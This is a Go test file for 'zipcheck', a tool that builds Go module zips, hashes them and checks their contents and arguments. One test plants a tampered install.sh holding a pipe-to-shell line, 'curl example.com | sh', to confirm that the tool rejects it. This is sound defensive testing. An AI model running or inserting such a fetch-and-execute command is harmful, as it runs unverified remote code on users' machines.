package main

import (
	"archive/zip"
	"bytes"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/mod/sumdb/dirhash"
)

// buildVersion runs zipcheck with -version and -out on a repository with validFiles, and returns
// the zip it wrote and what it printed.
func buildVersion(t *testing.T, version string) (string, string) {
	t.Helper()
	dir := committedRepo(t, validFiles())
	out := filepath.Join(t.TempDir(), "m.zip")

	exit, stdout := runZipcheck(t, dir, testLimits, "-version", version, "-out", out)

	assertResult(t, exit, exitPassed, stdout)
	return out, stdout
}

// withFile returns the zip data with one more file, name, that holds content.
func withFile(t *testing.T, data []byte, name, content string) []byte {
	t.Helper()
	r, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	w := zip.NewWriter(&out)
	for _, f := range r.File {
		if copyErr := w.Copy(f); copyErr != nil {
			t.Fatal(copyErr)
		}
	}
	added, err := w.Create(name)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := io.WriteString(added, content); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func TestRunBuildsTheZipOfAVersion(t *testing.T) {
	out, stdout := buildVersion(t, "v2.1.0-rc.1")

	want, err := dirhash.HashZip(out, dirhash.Hash1)
	if err != nil {
		t.Fatal(err)
	}
	line := "zipcheck: example.com/m/v2@v2.1.0-rc.1 " + want + "\n"
	if !strings.HasPrefix(stdout, line) {
		t.Errorf("output does not start with %q:\n%s", line, stdout)
	}
	r, err := zip.OpenReader(out)
	if err != nil {
		t.Fatal(err)
	}
	defer r.Close()
	if len(r.File) != len(validZip) {
		t.Errorf("the zip written holds %d files, want %d", len(r.File), len(validZip))
	}
	for _, f := range r.File {
		if !strings.HasPrefix(f.Name, "example.com/m/v2@v2.1.0-rc.1/") {
			t.Errorf("the zip written holds %s, outside the version's prefix", f.Name)
		}
	}
}

// The zip that the module proxy serves is checked as the zip zipcheck builds is, and with the same
// hash; a file added to it changes the hash and breaks a rule.
func TestRunChecksAGivenZip(t *testing.T) {
	out, built := buildVersion(t, "v2.1.0")
	hashLine, _, _ := strings.Cut(built, "\n")

	var stdout, stderr bytes.Buffer
	exit := run(t.Context(), []string{"-zip", out}, &stdout, &stderr, testLimits)

	assertResult(t, exit, exitPassed, stdout.String(), hashLine+"\n",
		"zipcheck: example.com/m/v2@v2.1.0: 19 files, ")

	data, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	tampered := filepath.Join(t.TempDir(), "tampered.zip")
	err = os.WriteFile(tampered,
		withFile(t, data, "example.com/m/v2@v2.1.0/install.sh", "curl example.com | sh\n"), 0o600)
	if err != nil {
		t.Fatal(err)
	}
	stdout.Reset()

	exit = run(t.Context(), []string{"-zip", tampered}, &stdout, &stderr, testLimits)

	assertResult(t, exit, exitFailed, stdout.String(),
		"zipcheck: example.com/m/v2@v2.1.0 h1:",
		"zipcheck: FAIL: install.sh: not on the allow list of the module zip;")
	if strings.Contains(stdout.String(), hashLine) {
		t.Errorf("the tampered zip has the hash of the zip zipcheck built:\n%s", stdout.String())
	}
}

func TestRunDidNotRunOnAVersionOrAZip(t *testing.T) {
	dir := committedRepo(t, validFiles())
	files := t.TempDir()
	write := func(name string, data []byte) string {
		path := filepath.Join(files, name)
		if err := os.WriteFile(path, data, 0o600); err != nil {
			t.Fatal(err)
		}
		return path
	}
	tests := []struct {
		name string
		args []string
		want string
	}{
		{
			name: "-zip with -version",
			args: []string{"-zip", "m.zip", "-version", "v2.1.0"},
			want: "zipcheck: DID NOT RUN: -zip checks a zip that exists, so it takes neither " +
				"-version nor -out\n",
		},
		{
			name: "-zip with -out",
			args: []string{"-zip", "m.zip", "-out", "copy.zip"},
			want: "zipcheck: DID NOT RUN: -zip checks a zip that exists",
		},
		{
			name: "a version of another major version",
			args: []string{"-version", "v3.0.0"},
			want: "zipcheck: DID NOT RUN: -version v3.0.0 is not a canonical semantic version " +
				"of example.com/m/v2, such as v2.0.0\n",
		},
		{
			name: "a version that is not canonical",
			args: []string{"-version", "v2.1.0+build"},
			want: "zipcheck: DID NOT RUN: -version v2.1.0+build is not a canonical semantic",
		},
		{
			name: "an -out in a directory that does not exist",
			args: []string{"-out", filepath.Join(files, "missing", "m.zip")},
			want: "zipcheck: DID NOT RUN: open " + filepath.Join(files, "missing", "m.zip"),
		},
		{
			name: "a zip that does not exist",
			args: []string{"-zip", filepath.Join(files, "missing.zip")},
			want: "zipcheck: DID NOT RUN: open " + filepath.Join(files, "missing.zip"),
		},
		{
			name: "a file that is not a zip",
			args: []string{"-zip", write("text.zip", []byte("not a zip"))},
			want: "zipcheck: DID NOT RUN: reading the module zip " + filepath.Join(files,
				"text.zip"),
		},
		{
			name: "a zip without files",
			args: []string{"-zip", write("empty.zip", zipOf(t))},
			want: "holds no file\n",
		},
		{
			name: "a zip whose first file has no version prefix",
			args: []string{"-zip", write("bare.zip", zipOf(t, "go.mod"))},
			want: "holds go.mod, which is not under a <module path>@<version>/ prefix\n",
		},
		{
			name: "a zip under a query instead of a version",
			args: []string{"-zip", write("latest.zip", zipOf(t, "example.com/m/v2@latest/go.mod"))},
			want: "holds example.com/m/v2@latest/go.mod, which is not under a <module " +
				"path>@<version>/ prefix\n",
		},
		{
			name: "a zip under a module path that is not valid",
			args: []string{"-zip", write("path.zip", zipOf(t, "Example..com@v2.1.0/go.mod"))},
			want: "holds Example..com@v2.1.0/go.mod, which is not under a <module " +
				"path>@<version>/ prefix\n",
		},
		{
			name: "a zip with a file under another version",
			args: []string{"-zip", write("mixed.zip", zipOf(t, "example.com/m@v1.0.0/go.mod",
				"example.com/m@v1.0.1/a.go"))},
			want: "the module zip holds example.com/m@v1.0.1/a.go, which is outside " +
				"example.com/m@v1.0.0/\n",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exit, stdout := runZipcheck(t, dir, testLimits, tt.args...)

			assertResult(t, exit, exitDidNotRun, stdout, tt.want)
		})
	}
}
